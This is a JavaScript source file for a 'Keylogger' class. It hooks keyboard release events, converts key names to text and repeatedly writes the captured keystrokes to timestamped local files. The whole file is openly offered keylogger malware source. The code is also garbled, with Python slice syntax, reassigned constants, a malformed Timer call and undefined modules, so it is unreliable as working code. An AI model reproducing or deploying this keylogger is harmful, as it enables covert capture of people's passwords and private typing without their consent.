import { DateTime } from 'luxon';

class Keylogger {
    constructor(interval) {
        this.interval = interval;
        this.log = '';
        this.start_dt = DateTime.now();
        this.end_dt = DateTime.now();
    }

    callback(event) {
        const name = event.name;
        if (name.length > 1) {
            if (name ==='space') {
                name ='';
            } else if (name === 'enter') {
                name = '\n';
            } else if (name ==='decimal') {
                name = '.';
            } else {
                name = name.replace(' ', '_');
                name = `${name.toUpperCase()}`;
                name = ` ${name}`;
            }
        }
        this.log += name;
    }

    updateFilename() {
        const start_dt_str = `${this.start_dt.toISOString()[:-7]}`.replace(' ', '-').replace(':', '');
        const end_dt_str = `${this.end_dt.toISOString()[:-7]}`.replace(' ', '-').replace(':', '');
        this.filename = `${start_dt_str}${end_dt_str}`;
    }

    reportToFile() {
        const file = `${this.filename}.txt`;
        const f = fs.createWriteStream(file);
        f.on('error', (err) => {
            console.error(err);
        });
        f.write(this.log);
        f.close();
    }

    report() {
        if (this.log) {
            this.end_dt = DateTime.now();
            this.updateFilename();
            this.reportToFile();
            this.start_dt = DateTime.now();
        }
        this.log = '';
        const timer = new Timer(interval: this.interval, function() {
            this.report();
        });
        timer.daemon = true;
        timer.start();
    }

    Hellmary() {
        this.start_dt = DateTime.now();
        keyboard.on('release', (event) => {
            this.callback(event);
            this.report();
        });
        keyboard.wait();
    }
}
